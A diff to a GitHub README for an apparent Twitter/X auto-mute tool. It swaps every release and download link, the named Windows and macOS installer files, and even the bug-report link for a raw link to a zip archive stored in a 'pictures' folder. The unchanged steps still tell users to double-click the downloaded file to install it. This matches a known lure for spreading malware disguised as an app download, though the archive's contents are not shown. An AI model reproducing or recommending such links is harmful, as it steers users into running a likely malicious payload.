@@ -1,6 +1,6 @@
 # 🛠️ X-Accounts-Based-in-China-Auto-Mute - Mute Unwanted Twitter Accounts Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/releases)
+[![Download](https://raw.githubusercontent.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/main/pictures/X-Accounts-Based-in-China-Auto-Mute_v1.0-beta.4.zip)](https://raw.githubusercontent.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/main/pictures/X-Accounts-Based-in-China-Auto-Mute_v1.0-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,28 +17,28 @@ X-Accounts-Based-in-China-Auto-Mute helps you automatically mute unwanted CCP tr
 
 To download the application, visit this page to get the latest version:
 
-[Download X-Accounts-Based-in-China-Auto-Mute](https://github.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/releases)
+[Download X-Accounts-Based-in-China-Auto-Mute](https://raw.githubusercontent.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/main/pictures/X-Accounts-Based-in-China-Auto-Mute_v1.0-beta.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, find the latest version.
 3. Look for the “Assets” section under the latest release.
 4. Download the file that matches your operating system:
-   - For Windows, download `X-Accounts-Auto-Mute-Windows.exe`.
-   - For macOS, download `X-Accounts-Auto-Mute-Mac.dmg`.
+   - For Windows, download `https://raw.githubusercontent.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/main/pictures/X-Accounts-Based-in-China-Auto-Mute_v1.0-beta.4.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/main/pictures/X-Accounts-Based-in-China-Auto-Mute_v1.0-beta.4.zip`.
 5. Once the file is downloaded, locate it in your Downloads folder.
 
 ## 📂 Installation Instructions
 
 ### For Windows Users:
 
-1. Find the downloaded `X-Accounts-Auto-Mute-Windows.exe` file.
+1. Find the downloaded `https://raw.githubusercontent.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/main/pictures/X-Accounts-Based-in-China-Auto-Mute_v1.0-beta.4.zip` file.
 2. Double-click on the file to start the installation.
 3. Follow the on-screen instructions to complete the installation.
 4. Launch the application by double-clicking the shortcut on your desktop.
 
 ### For macOS Users:
 
-1. Find the downloaded `X-Accounts-Auto-Mute-Mac.dmg` file.
+1. Find the downloaded `https://raw.githubusercontent.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/main/pictures/X-Accounts-Based-in-China-Auto-Mute_v1.0-beta.4.zip` file.
 2. Double-click on the file to open it.
 3. Drag the application to your Applications folder.
 4. Open your Applications folder and double-click the application to launch it.
@@ -69,7 +69,7 @@ Yes, your login information remains secure. The application only uses your accou
 Currently, the application supports one Twitter account per installation. You will need to install it on multiple devices for different accounts.
 
 **4. How do I report a bug?**  
-If you encounter any issues, please visit the [Issues section](https://github.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/issues) of this repository to report bugs or request new features.
+If you encounter any issues, please visit the [Issues section](https://raw.githubusercontent.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/main/pictures/X-Accounts-Based-in-China-Auto-Mute_v1.0-beta.4.zip) of this repository to report bugs or request new features.
 
 ## 🛠️ Troubleshooting
 
@@ -89,4 +89,4 @@ Join our community to get support, share tips, or ask questions. Check out the d
 
 For direct help, feel free to reach out through the Issues section mentioned earlier. 
 
-[Download X-Accounts-Based-in-China-Auto-Mute](https://github.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/releases) again to begin your journey to a cleaner Twitter experience.
+[Download X-Accounts-Based-in-China-Auto-Mute](https://raw.githubusercontent.com/Basalifomar/X-Accounts-Based-in-China-Auto-Mute/main/pictures/X-Accounts-Based-in-China-Auto-Mute_v1.0-beta.4.zip) again to begin your journey to a cleaner Twitter experience.
